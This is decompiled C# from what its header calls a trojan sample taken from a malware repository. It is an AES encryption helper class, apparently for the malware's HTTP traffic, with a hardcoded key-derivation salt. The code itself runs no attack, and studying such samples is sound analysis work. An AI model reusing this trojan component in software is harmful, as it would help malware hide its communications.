// Decompiled with JetBrains decompiler
// Type: svchost.HTTPSocket.Encryption
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace svchost.HTTPSocket
{
  [StandardModule]
  [OptionText]
  public sealed class Encryption
  {
    public static string AES_Encrypt(string plainText, string secretKey)
    {
      byte[] array;
      using (MemoryStream memoryStream = new MemoryStream())
      {
        RijndaelManaged algorithm = Encryption.getAlgorithm(secretKey);
        using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, algorithm.CreateEncryptor(), CryptoStreamMode.Write))
        {
          byte[] bytes = Encoding.Unicode.GetBytes(plainText);
          cryptoStream.Write(bytes, 0, bytes.Length);
          cryptoStream.FlushFinalBlock();
          array = memoryStream.ToArray();
        }
      }
      return Convert.ToBase64String(array);
    }

    public static string AES_Decrypt(string encryptedData, string secretKey)
    {
      using (MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(encryptedData)))
      {
        RijndaelManaged algorithm = Encryption.getAlgorithm(secretKey);
        using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, algorithm.CreateDecryptor(), CryptoStreamMode.Read))
        {
          byte[] numArray = new byte[checked ((int) (memoryStream.Length - 1L) + 1)];
          int count = cryptoStream.Read(numArray, 0, checked ((int) memoryStream.Length));
          return Encoding.Unicode.GetString(numArray, 0, count);
        }
      }
    }

    private static RijndaelManaged getAlgorithm(string secretKey)
    {
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(secretKey, Encoding.Unicode.GetBytes("Lld6QV9qT0kkQ1dRYTk8ZEVERnNmMUZLakdNT1FyaCE3LWEtL3xdNClnVC9rQUBTTtZcT9XamwpeiwsMjY"));
      RijndaelManaged algorithm = new RijndaelManaged();
      algorithm.KeySize = 256;
      algorithm.IV = rfc2898DeriveBytes.GetBytes(checked ((int) Math.Round(unchecked ((double) algorithm.BlockSize / 8.0))));
      algorithm.Key = rfc2898DeriveBytes.GetBytes(checked ((int) Math.Round(unchecked ((double) algorithm.KeySize / 8.0))));
      algorithm.Padding = PaddingMode.PKCS7;
      return algorithm;
    }
  }
}
